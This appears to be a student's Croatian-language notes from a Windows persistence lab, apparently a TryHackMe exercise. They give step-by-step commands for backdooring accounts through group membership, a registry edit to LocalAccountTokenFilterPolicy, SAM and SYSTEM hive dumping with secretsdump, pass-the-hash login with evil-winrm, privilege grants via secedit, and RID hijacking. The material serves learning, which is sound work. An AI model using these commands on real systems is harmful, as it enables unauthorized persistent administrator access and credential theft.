Za početaj najlaksa stvar koju mozemo pokusati je dodati korisnika u admin grupu:

C:\> net localgroup administrators userAccount /add
ili
C:\> net localgroup "Backup Operators" thmuser1 /add

C:\> net localgroup "Remote Management Users" thmuser1 /add

Potrebno je korisnika dodati u grupe Backup operators da moze citati i spremati registry, i remote management access da mozemo korisiti remote access.
Naš cilj je omogučiti korisnicima da imaju administratorske ovlasti dok su spojeni remote.
Zbog UAC (User Account Control) tokena LocalAccountTokenFilterPolicy koji mice administratorske ovlasti svakoga računa kada mu se pristupi remote.
Kako bi dobili administratorkse ovlasti trebamo iskljuciti LocalAccountTokenFilterPolicy i postaviti ga na 1:

C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

Nakon što smo uspjesno omogucili pristup remote korisnicima administratorksa prava, instaliram sam i system .bak datoteke
reg save hklm\system system.bak
reg save hklm\sam sam.bak  
#MORA BITI U ROOTU POZICIJA, TJ c:\>
(za ovo sam koristion evil-winrm)

download sam.bak system.bak

koristeci pyhon secretsdump ispisujem sve potrebne podatke iz njih:

impacket-secretsdump -sam sam.bak -system system.bak LOCAL

Iz toga dobivamo hash korisnika, tako da se mozemo preko evil-winrm logirati
evil-winrm -i 10.10.42.120 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3

Special Privileges and Security Descriptors
Zapocinjemo iz admin racuna
Slicno prijasnjem primjeru, no u ovome slucaju ne mjenjamo specifikacije grupa.

Ovaj exploit se bazira na dozvolama:

SeBackupPrivilege
SeRestorePrivilege

Prvo trebamo ispisati i spremiti datoteku config.inf:

secedit /export /cfg config.inf

Kada smo to dobili dodajemo u redove koji sadrže SeBackupPrivilege, SeRestorePrivilege ime računa kojeg zelimo da bude koristen za backdoor.
Kako bismo spremili tu datoteku moramu ju convertati u sdb format koristeci ove naredbe:

secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf

No sada cemo napraviti nesto drukcije od prosle vjezbe. Umjesto da dodajemo korisnika u remote access grupu, izmjeniti cemo sigurnosni deskriptor.
Kako bi otvorili taj deskriptor preko powershella izvrsavamo naredbu:

Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI

I preko grafickog sucenja dodajemo korisnika u grupu i stavljamo mu prava (Full Control)
Sada sve što je potrebno izbaciti hasheve i podatke (TO SMO NAPRAVILI U PROSLOME ZADATKU)
Mozemo provjeriti kako izgledaju informacije o nasem korisniku preko net uset Korisnik



RID hijacking
Jos jedna metoda kako bi dobili admin privilegije bez mjenjanja rola je tako da promjenimo registry vrijednosti tako da OS misli da smo admin.
Trazimo korisnicki SID preko naredbe:

wmic useraccount get name,sid

i dobiti cemo ovakav ispis:

Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008

Nama je cilj staviti da RID (broj na kraju 500,503,...) bude isti kao i administratoru.
Nacin da to uspijemo je preko alata psexec (jer u protivnom nije dozvoljeno editiranje registrija)
Koristimo:

PsExec64.exe -i -s regedit

Kada otvorimo idemo u HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\{RID u hexa zapisu} i otvaramo datoteku F
Kada smo usli u nju pretvaramo RID u deakatski, a to znaci da 1008 je 0x3F0
Datototeka je zapisana u little endian načinu tako da cemo traziti dvije uzastopne celije na početku reda koje sadrze F0 03.
Kad ih pronađemo mjenjamo ih u F4 01 (hexa od 500)
Iduci put kada se korisnik prijavi imati ce administracijske dozvole.
